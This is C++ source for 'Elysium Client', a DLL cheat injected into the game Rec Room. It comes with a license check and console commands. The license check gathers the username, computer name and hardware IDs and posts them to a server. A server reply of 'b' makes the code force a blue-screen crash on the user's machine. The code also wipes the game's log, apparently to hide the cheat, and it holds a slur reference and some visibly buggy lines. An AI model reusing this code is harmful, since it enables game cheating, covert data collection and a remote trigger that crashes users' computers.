#include "main.hpp"
#include <windows.h>
#include <iostream>
#include <Minhook.h>
#include <random>
#include <thread>
#include <string>
#include <sstream>
#include <fstream>
#include <cstdlib>
#include <cstring>
#pragma comment(lib, "ntdll.lib")

// bsod stuff
extern "C" NTSTATUS NTAPI RtlAdjustPrivilege(ULONG Privilege, BOOLEAN Enable, BOOLEAN CurrentThread, PBOOLEAN OldValue);
extern "C" NTSTATUS NTAPI NtRaiseHardError(LONG ErrorStatus, ULONG NumberOfParameters, ULONG UnicodeStringParameterMask,
    PULONG_PTR Parameters, ULONG ValidResponseOptions, PULONG Response);

// auth
#include <curl/curl.h>
#include <Lmcons.h>
#include <iomanip>
#include <cstring>
#include "json.hpp"

// discord
#include "Discord/discord_rpc.h"

// SHUT THE FUCK UP YOU STUPID FUCKING PIECE OF SHIT IDE AND BUILD MY PROJECT YOU SUFFER FROM BRAINROT
#define _SILENCE_CXX17_CODECVT_HEADER_DEPRECATION_WARNING
#define _CRT_SECURE_NO_WARNINGS
#pragma warning(disable:4996)
#pragma warning(disable:4244)
#pragma warning(disable:4267)

// load notification
bool notify = true;

void showNotification(const std::string& message, int timeout) {
    if (notify = true)
    {
        const std::string VerNum{ "BETA v0.7" };
        NOTIFYICONDATA nid = {};
        nid.cbSize = sizeof(nid);
        nid.hWnd = NULL; // handle to the window that will receive notifications
        std::mt19937 rng(std::random_device{}());
        std::uniform_int_distribution<int> dist(1, 9999999999999999999);
        nid.uID = dist(rng); // set nid.uID to a random value
        nid.uFlags = NIF_ICON | NIF_INFO;
        nid.hIcon = LoadIcon(NULL, IDI_EXCLAMATION); // load the exclamation icon
        nid.uTimeout = timeout;
        nid.dwInfoFlags = NIIF_INFO;
        std::string full_title = "Elysium " + VerNum + "\nby neptune#1995 & VT#1065";  // title of the notification
        strcpy_s(nid.szInfoTitle, full_title.c_str());
        strcpy_s(nid.szInfo, std::string(message).c_str()); // message to display in the notification
        Shell_NotifyIcon(NIM_ADD, &nid); // show the notification
    }
}

std::string get_device_id() {
    std::string result;

    // Retrieve the processor ID from the registry
    HKEY hKey;
    DWORD dwType;
    DWORD dwSize = 16;
    std::vector<char> szProcessorId(dwSize + 1);
    if (RegOpenKeyExA(HKEY_LOCAL_MACHINE, "HARDWARE\\DESCRIPTION\\System\\CentralProcessor\\0", 0, KEY_READ, &hKey) == ERROR_SUCCESS) {
        if (RegQueryValueExA(hKey, "~MHz", NULL, &dwType, reinterpret_cast<LPBYTE>(szProcessorId.data()), &dwSize) == ERROR_SUCCESS) {
            szProcessorId[dwSize] = '\0';
            result += szProcessorId.data();
        }
        RegCloseKey(hKey);
    }

    // Retrieve the motherboard ID from the registry
    if (RegOpenKeyExA(HKEY_LOCAL_MACHINE, "HARDWARE\\DESCRIPTION\\System\\BIOS", 0, KEY_READ, &hKey) == ERROR_SUCCESS) {
        dwSize = 40;
        std::vector<char> szBaseBoardId(dwSize + 1);
        if (RegQueryValueExA(hKey, "BaseBoardProduct", NULL, &dwType, reinterpret_cast<LPBYTE>(szBaseBoardId.data()), &dwSize) == ERROR_SUCCESS) {
            szBaseBoardId[dwSize] = '\0';
            result += szBaseBoardId.data();
        }
        RegCloseKey(hKey);
    }

    // Retrieve the boot drive ID from the registry
    if (RegOpenKeyExA(HKEY_LOCAL_MACHINE, "SYSTEM\\MountedDevices", 0, KEY_READ, &hKey) == ERROR_SUCCESS) {
        dwSize = 1024;
        std::vector<BYTE> pData(dwSize);
        if (RegQueryValueExA(hKey, "\\DosDevices\\C:", NULL, &dwType, pData.data(), &dwSize) == ERROR_SUCCESS) {
            std::stringstream ssBootDriveId;
            ssBootDriveId << std::hex << std::setw(2) << std::setfill('0') << static_cast<int>(pData[8])
                << std::setw(2) << std::setfill('0') << static_cast<int>(pData[9])
                << std::setw(2) << std::setfill('0') << static_cast<int>(pData[10])
                << std::setw(2) << std::setfill('0') << static_cast<int>(pData[11]);
            result += ssBootDriveId.str();
        }
        RegCloseKey(hKey);
    }

    // Format the device ID string
    std::stringstream ss;
    for (int i = 0; i < result.size(); i++) {
        ss << std::setw(2) << std::setfill('0') << std::hex << static_cast<int>(result[i]);
    }

    return ss.str();
}

static void UpdatePresence()
{
    time_t start_time = time(nullptr);
    time_t elapsed_time = time(nullptr) - start_time;

    int hours = elapsed_time / 3600;
    int minutes = (elapsed_time % 3600) / 60;
    int seconds = elapsed_time % 60;

    DiscordRichPresence discordPresence;
    memset(&discordPresence, 0, sizeof(discordPresence));

    discordPresence.state = "Buy now at Discord.gg/ApeShop";
    discordPresence.details = "Elysium Client BETA v0.7";
    discordPresence.startTimestamp = start_time * 1000; // set the start timestamp to the current time
    //discordPresence.endTimestamp = (start_time + elapsed_time) * 1000; // set the end timestamp to the current time
    discordPresence.largeImageKey = "nword";
    discordPresence.largeImageText = "Made by neptune#1995 & VT#1065";
    //discordPresence.smallImageText = "Rec Room";
    //discordPresence.partyId = "ae488379-351d-4a4f-ad32-2b9b01c91657";
    //discordPresence.partySize = 1;
    //discordPresence.partyMax = 4;
    //discordPresence.joinSecret = "MTI4NzM0OjFpMmhuZToxMjMxMjM= ";
    Discord_UpdatePresence(&discordPresence);
}

// thing for auth
size_t writeCallback(char* buf, size_t size, size_t nmemb, std::string* response) {
    response->append(buf, size * nmemb);
    return size * nmemb;
}

void consoleThread() {
    const std::string VerNum{ "BETA v0.7" };
    AllocConsole();

    freopen("CONIN$", "r", stdin);
    freopen("CONOUT$", "w", stdout);
    std::string title = "Elysium Client Authentication | by neptune#1995 & VT#1065";
    SetConsoleTitleA(title.c_str());
    //std::cout << "Elysium Client Authentication" << std::endl;
    CURL* curl;
    CURLcode res;


    // Get hardware profile info
    HW_PROFILE_INFO hwProfileInfoStruct;
    if (GetCurrentHwProfileA(&hwProfileInfoStruct)) {
        std::string hwProfileInfo = std::string(hwProfileInfoStruct.szHwProfileGuid);
    }
    curl = curl_easy_init();
    if (curl) {
        curl_easy_setopt(curl, CURLOPT_URL, "https://google.com/");

        HW_PROFILE_INFO hwProfileInfo;
        GetCurrentHwProfile(&hwProfileInfo);

        char username[UNLEN + 1];
        DWORD username_len = UNLEN + 1;
        GetUserName(username, &username_len);

        char computer_name[MAX_COMPUTERNAME_LENGTH + 1];
        DWORD size = sizeof(computer_name);
        GetComputerNameA(computer_name, &size);

        std::string device_id = get_device_id();
        std::string key;

        std::cout << "Enter your license key: " << std::endl;
        std::cin >> key;
        std::string data = "&pc=" + std::string(computer_name) + "&user=" + std::string(username) + "&hwid=" + device_id + "&hwidl=" + std::string(hwProfileInfo.szHwProfileGuid) + "&key=" + key;

        // encode
        const char* data_bytes = data.c_str();
        size_t data_size = strlen(data_bytes);

        // encode the byte array into hexadecimal format
        std::stringstream hex_stream;
        hex_stream << std::hex << std::setfill('0');
        for (size_t i = 0; i < data_size; i++)
        {
            hex_stream << std::setw(2) << static_cast<int>(static_cast<unsigned char>(data_bytes[i]));
        }
        std::string encoded_data = hex_stream.str();
        std::string enreq = "&data=" + encoded_data;

        // set the post data
        curl_easy_setopt(curl, CURLOPT_POSTFIELDS, enreq.c_str());

        // send request
        std::string response;
        curl_easy_setopt(curl, CURLOPT_WRITEFUNCTION, writeCallback);
        curl_easy_setopt(curl, CURLOPT_WRITEDATA, &response);
        res = curl_easy_perform(curl);

        struct curl_slist* headers = NULL;
        headers = curl_slist_append(headers, "Content-Type: application/x-www-form-urlencoded");
        curl_easy_setopt(curl, CURLOPT_HTTPHEADER, headers);



        if (res != CURLE_OK) {
            std::cerr << "Authentication Error: " << curl_easy_strerror(res) << std::endl;
            std::exit(0);
        }
        else {
            nlohmann::json jsonResponse = nlohmann::json::parse(response);

            if (jsonResponse.find("Message") != jsonResponse.end()) 
            {
                if (std::string(jsonResponse["Message"].get<std::string>().c_str()) == std::string("b")) 
                {
                    std::cout << "test";
                    std::cin;
                    BOOLEAN bl;
                    ULONG Response;
                    RtlAdjustPrivilege(19, TRUE, FALSE, &bl); // Enable SeShutdownPrivilege
                    NtRaiseHardError(STATUS_ASSERTION_FAILURE, 0, 0, NULL, 6, &Response); // Shutdown
                }
                else if (std::string(jsonResponse["Message"].get<std::string>().c_str()) == std::string("q"))
                {
                    //std::exit(0);
                }
                else 
                {
                    MessageBox(NULL, jsonResponse["Message"].get<std::string>().c_str(), "Elysium Notification", MB_OK);
                }
            }

            if (jsonResponse["key"] == key + device_id) 
            {

                //system("cls");
                std::cout << "Session Authenticated." << std::endl;
                std::this_thread::sleep_for(std::chrono::milliseconds(500));
                system("cls");
                std::string title = "Elysium Client " + std::string(VerNum) + " >:3 | by neptune#1995 & VT#1065";
                SetConsoleTitleA(title.c_str());
                std::cout << "Welcome to Elysium Client " + std::string(VerNum) + "! \nMade by neptune#1995 & VT#1065" << std::endl;
                std::thread(&main).detach();
                //init();

            }
            else if (jsonResponse["key"] == "b")
            {
				std::cout << "Invalid Key!" << std::endl;
                std::cin;
                BOOLEAN bl;
                ULONG Response;
                RtlAdjustPrivilege(19, TRUE, FALSE, &bl); // Enable SeShutdownPrivilege
                NtRaiseHardError(STATUS_ASSERTION_FAILURE, 0, 0, NULL, 6, &Response); // Shutdown
			}
            else
            {
                std::cout << jsonResponse["key"] << std::endl;
                std::cout << "Authentication Failed!" << std::endl;
                //init();
                //std::exit(80085);
            }

            // discord stuff
            DiscordEventHandlers Handle;
            memset(&Handle, 0, sizeof(Handle));
            Discord_Initialize("1079687619773988865", &Handle, 1, NULL);
            std::thread(UpdatePresence).detach();


            bool exit{ false };

            while (true)
            {

                // clear player.log
                const char* appdataPath = std::getenv("LOCALAPPDATA");
                const char* filePath = "\\..\\LocalLow\\Against Gravity\\Rec Room\\Player.log";
                char fullPath[MAX_PATH];
                std::strcpy(fullPath, appdataPath);
                std::strcat(fullPath, filePath);
                std::ofstream file(fullPath);
                file.close();


                std::string cmd;
                std::cout << " > ";
                std::getline(std::cin, cmd);
                std::transform(cmd.begin(), cmd.end(), cmd.begin(), [](unsigned char c) { return std::tolower(c); });

                if (cmd == "alloff")
                {
                    //MH_EnableHook(reinterpret_cast<LPBOOL*>(GameAssembly + Hysteria));
                    /*
                    * 8706-5 shadowban cause role anti-cheat
                    *
                    MH_EnableHook(reinterpret_cast<LPBOOL*>(GameAssembly + CanSpawnConsumable));
                    MH_EnableHook(reinterpret_cast<LPBOOL*>(GameAssembly + CanUseSharecam));
                    */
                    MH_DisableHook(MH_ALL_HOOKS);
                    std::cout << "[Elysium] Toggled Everything Off." << std::endl;
                    showNotification("All Modules Toggled Off.", 500);
                }
                else if (cmd == "quit")
                {
                    MH_DisableHook(MH_ALL_HOOKS);
                    MH_Uninitialize();
                    Discord_Shutdown();
                    std::cout << "[Elysium] Unloading DLL, you can now close the console." << std::endl;
                    showNotification("Elysium Client has Unloaded.", 1000);
                    break;
                }
                else if (cmd == "notif")
                {
                    notify = !notify;

                    if (notify == true)
                    {
                        std::cout << "[Elysium] Toggled Notifications On." << std::endl;
                        showNotification("Notifications On.", 500);
                    }
                    else
                    {
                        std::cout << "[Elysium] Toggled Notifications Off." << std::endl;
                    }
                }
                else if (cmd == "exit")
                {
                    MH_DisableHook(MH_ALL_HOOKS);
                    MH_Uninitialize();
                    Discord_Shutdown();
                    exit = true;
                    std::cout << "[Elysium] Exiting." << std::endl;
                    showNotification("Elysium Client Exited.", 1000);
                    break;
                }
                else if (cmd == "help")
                {
                    std::cout << "Available commands:" << std::endl;
                    std::cout << "- alloff: Toggles all modules off" << std::endl;
                    std::cout << "- notif: Toggles notifications" << std::endl;
                    std::cout << "- quit: Unloads Elysium" << std::endl;
                    std::cout << "- exit: Unloads Elysium & quits Rec Room" << std::endl;
                    std::cout << "- help: Shows this text" << std::endl;
                }
                else
                {
                }
                std::cin.clear();
            }
            FreeConsole();
            DLL_PROCESS_DETACH;
            if (exit)
            {
                std::exit(0);
            }
            ExitThread;
        }
    }
}

BOOL APIENTRY DllMain(HMODULE hModule, DWORD  ul_reason_for_call, LPVOID lpReserved)
{
    if (ul_reason_for_call != DLL_PROCESS_ATTACH) {
        return false;
    }
    std::thread(consoleThread).detach();
    //std::thread(&main).detach();
    DisableThreadLibraryCalls(hModule);

    return true;
}
